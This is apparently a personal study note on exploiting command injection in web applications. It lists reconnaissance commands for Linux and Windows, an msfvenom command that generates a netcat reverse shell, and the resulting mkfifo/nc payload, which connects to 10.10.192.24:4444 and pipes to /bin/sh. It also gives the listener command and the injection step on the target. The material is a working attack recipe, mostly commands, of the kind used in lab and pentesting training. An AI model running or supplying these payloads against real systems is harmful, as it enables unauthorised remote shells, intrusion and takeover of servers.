If WebApp User Inputs are accepted and run as System Commands

# Active Command Injection

If User Input is returned as HTML Element

Commands to test:

Linux
```
whoami
id
ifconfig/ip addr
uname -a
ps -ef
```

Windows

```
whoami
ver
ipconfig
tasklist
netstat -an
```


# Reverse Shell

=> Code to execute Code/Commands on the Target

Aim is for the Target to build a Connection to myself


**[msfvenom](msfvenom)** => creates and encodes a netcat reverse Shell (create an payload Command which has to run on the Target)

Create a Payload on the local Machine:

`msfvenom -p cmd/unix/reverse_netcat lhost=[localhost ip] lport=4444 R`

Output:

`mkfifo /tmp/pshz; nc 10.10.192.24 4444 0</tmp/pshz | /bin/sh >/tmp/pshz 2>&1; rm /tmp/pshz`

Start a [netcat](netcat) Listener on the Local Machine:

`nc -lvp 4444`

- use port from msfvenom

Run the Paylod Command on the Target:

`.RUN mkfifo /tmp/pshz; nc 10.10.192.24 4444 0</tmp/pshz | /bin/sh >/tmp/pshz 2>&1; rm /tmp/pshz`

We should get a connection with netcat